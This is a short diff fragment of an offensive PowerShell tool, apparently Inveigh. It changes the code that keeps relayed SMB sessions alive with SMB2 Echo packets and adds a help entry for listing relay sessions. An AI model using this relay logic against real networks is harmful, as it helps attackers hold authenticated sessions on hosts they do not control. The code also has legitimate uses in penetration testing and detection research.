-                $inveigh.log.Add($inveigh.output_queue[0]) > $null
-            }
-
-            $inveigh.output_queue.RemoveAt(0)
-        }
 
         if($RelayAutoExit -eq 'Y' -and !$inveigh.SMB_relay)
         {
@@ -3732,6 +3762,7 @@ $control_relay_scriptblock =
 
         }
 
+        OutputQueueLoop
         Start-Sleep -m 5
     }
 
@@ -3741,6 +3772,8 @@ $control_relay_scriptblock =
 $session_refresh_scriptblock = 
 {
     param ($SessionRefresh)
+
+    $process_ID_bytes = Get-ProcessIDArray
 
     while($inveigh.relay_running)
     {
@@ -3762,12 +3795,9 @@ $session_refresh_scriptblock =
                     $SMB2_message_ID =  $inveigh.session_message_ID_table[$session]
                     $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                     $SMB_client_receive = New-Object System.Byte[] 1024
-                    $SMB_path = "\\" + $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString + "\IPC$"
-                    $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
                     $SMB2_message_ID++
-                    $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x1f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                    #$packet_SMB2_header["ProcessID"] = $process_ID_bytes
-                    $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
+                    $packet_SMB2_header = New-PacketSMB2Header 0x0D,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
+                    $packet_SMB2_data = New-PacketSMB2Echo
                     $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                     $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                     $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
@@ -3782,7 +3812,7 @@ $session_refresh_scriptblock =
                     }
                     catch
                     {
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay SMB session $session has closed")
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay SMB session $session has closed") > $null
                     }
 
                     $inveigh.session_lock_table[$Session] = 'open'
@@ -3791,12 +3821,12 @@ $session_refresh_scriptblock =
                 }
 
                 $session++
+                Start-Sleep -s 1
             }
-        
-            
+         
         }
 
-        Start-Sleep -m 5
+        Start-Sleep -s 1
     }
 
 }
@@ -4358,6 +4388,9 @@ Get captured POST requests.
 
 .PARAMETER POSTRequestUnique
 Get unique captured POST request.
+
+.PARAMETER Session
+Get relay session list.
 #>
 
     [CmdletBinding()]
